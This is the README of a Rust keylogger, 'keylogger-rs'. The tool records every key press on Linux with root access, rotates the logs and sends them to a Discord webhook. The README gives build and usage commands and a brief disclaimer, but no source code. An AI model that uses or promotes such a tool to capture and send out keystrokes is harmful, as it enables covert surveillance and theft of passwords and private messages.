# keylogger-rs

[![Rust](https://img.shields.io/badge/Rust-1.85+-orange.svg)](https://www.rust-lang.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![GitHub issues](https://img.shields.io/github/issues/lafayettegabe/keylogger-rs)](https://github.com/lafayettegabe/keylogger-rs/issues)
[![GitHub stars](https://img.shields.io/github/stars/lafayettegabe/keylogger-rs)](https://github.com/lafayettegabe/keylogger-rs/stargazers)
![Platform](<https://img.shields.io/badge/platform-Linux%20%7C%20Windows(planned)%20%7C%20macOS(planned)-lightgrey>)

A simple, cross-platform keylogger utility written in Rust with features for automated log rotation and remote logging.

## Features

- Keyboard event monitoring and logging on Linux (with more platforms planned)
- Configurable log rotation with customizable intervals
- Discord webhook integration for remote log delivery
- Simple command-line interface
- Clean logging format with detailed timestamps

## Requirements

- Rust 1.85.0 or newer
- For Linux support:
  - `libudev-dev` package (for evdev support)
  - Root access (to read from input devices)

## Installation

```bash
# Clone the repository
git clone https://github.com/lafayettegabe/keylogger-rs.git
cd keylogger-rs

# Build with default features (Linux and Discord support)
cargo build --release

# Build with specific features only
cargo build --release --no-default-features --features linux
```

## Usage

```bash
# Basic usage
sudo ./target/release/keylogger-rs -s linux -o logs -d 3600

# With Discord webhook
sudo ./target/release/keylogger-rs -s linux -o logs -d 3600 -w https://discord.com/api/webhooks/your-webhook-url
```

### Command-line options

```
USAGE:
    keylogger-rs [OPTIONS] --os <OS>

OPTIONS:
    -s, --os <OS>              Operating system (linux, windows, mac)
    -o, --output <DIRECTORY>   Directory to save log files [default: logs]
    -d, --duration <SECONDS>   Log rotation interval in seconds [default: 3600]
    -w, --webhook <URL>        Discord webhook URL for sending logs
    -h, --help                 Print help information
    -V, --version              Print version information
```

### Environment Variables

Instead of command-line arguments, you can use environment variables:

- `KEYLOGGER_OUTPUT`: Directory to save log files
- `KEYLOGGER_DURATION`: Log rotation interval in seconds
- `KEYLOGGER_WEBHOOK`: Discord webhook URL

## Project Structure

```
src
├── config           # Command-line and configuration handling
├── main.rs          # Application entry point
├── os               # OS-specific implementations
│   ├── linux        # Linux keyboard monitoring
│   │   └── keyboard
├── utils            # Utility modules
    ├── errors       # Error handling
    ├── log_manager  # Log rotation and management
    └── writer       # File writing utilities
```

## Feature Flags

- `linux`: Enables Linux keyboard monitoring support via evdev
- `discord`: Enables Discord webhook integration via reqwest
- Default features include both `linux` and `discord`

## How It Works

1. The program detects a keyboard device on the system
2. Key press and release events are captured with timestamps
3. Events are written to log files in the specified output directory
4. Logs are rotated at the configured interval
5. If a Discord webhook is configured, logs are sent there before deletion

## Log Format

Each log entry includes:

- Precise timestamp with millisecond precision
- Event type (Pressed/Released)
- Key code

Example:

```
[2025-03-17 14:22:31.123] Pressed: KEY_A
[2025-03-17 14:22:31.245] Released: KEY_A
```

## Platform Support

- ✅ Linux: Fully supported
- 🔄 Windows: Planned
- 🔄 macOS: Planned

## Security Notice

⚠️ **This software is intended for educational purposes and legitimate system monitoring only.** Always ensure you have explicit permission to monitor keyboard activity on any system. Unauthorized monitoring may violate local laws.

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the project
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request
